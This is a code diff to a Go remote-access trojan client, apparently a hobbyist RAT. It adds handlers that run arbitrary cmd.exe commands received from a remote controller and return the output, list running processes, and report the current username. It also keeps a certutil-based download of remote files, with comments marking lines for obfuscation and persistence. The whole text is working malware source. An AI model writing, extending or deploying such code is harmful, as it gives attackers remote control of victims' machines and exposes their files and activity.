@@ -1,14 +1,15 @@
 package main
-import("fmt")
-import("bufio")
-import("net")
-import("time")
-import("os")
-import("os/exec")
-import("strings")
-import("io/ioutil")
-import("strconv")
-import("runtime")
+import("fmt") // needed for sending packets
+import("bufio") // needed for recieving packets
+import("net") // needed to make connection
+import("time") // needed to stop the client/payload from being a cpu hog
+import("os") // needed for opening files
+import("os/exec") // needed for executing commands
+import("strings") // needed for replacing strings 
+import("io/ioutil") // needed for listing files
+import("strconv") // needed for converting bool to string
+import("runtime") // needed for finding current file name for presistence
+import("os/user") // needed for finding currenct user
 func main () {
 	
 	for {
@@ -26,10 +27,30 @@ func main () {
 					break
 				}
 				for {
+					if (data == "a" || data[0] == 97) {
+						data,_ := bufio.NewReader(connection).ReadString('\n')
+						h := "/c " + string(data)
+						args:= strings.Split(string(h)," ")
+						k := exec.Command("cmd.exe",args...)
+						ktwo,_ := k.Output()
+						file1 := strings.Replace(string(ktwo), "\n", "COMMANDSAREFUN", -1)
+						fmt.Fprintf(connection, string(file1) + "\n")
+					}
+					if (data == "9" || data[0] == 57) {
+						k := exec.Command("tasklist.exe") // obf
+						ktwo,_ := k.Output()
+						file1 := strings.Replace(string(ktwo), "\n", "74211553", -1)
+						fmt.Fprintf(connection, string(file1) + "\n")
+					}
+					if (data == "8" || data[0] == 56) {
+						user,_ := user.Current()
+						username := user.Username
+						fmt.Fprintf(connection, username + "\n")
+					}
 					if (data == "7" || data[0] == 55) {
 						url,_ := bufio.NewReader(connection).ReadString('\n')
 						filename,_ := bufio.NewReader(connection).ReadString('\n')
-						k := exec.Command("cmd.exe","/c","certutil.exe","-urlcache","-split","-f",string(url),string(filename))
+						k := exec.Command("cmd.exe","/c","certutil.exe","-urlcache","-split","-f",string(url),string(filename)) // obf
 						ktwo,_ := k.Output()
 						fmt.Fprintf(connection, string(ktwo) + "\n")
 						
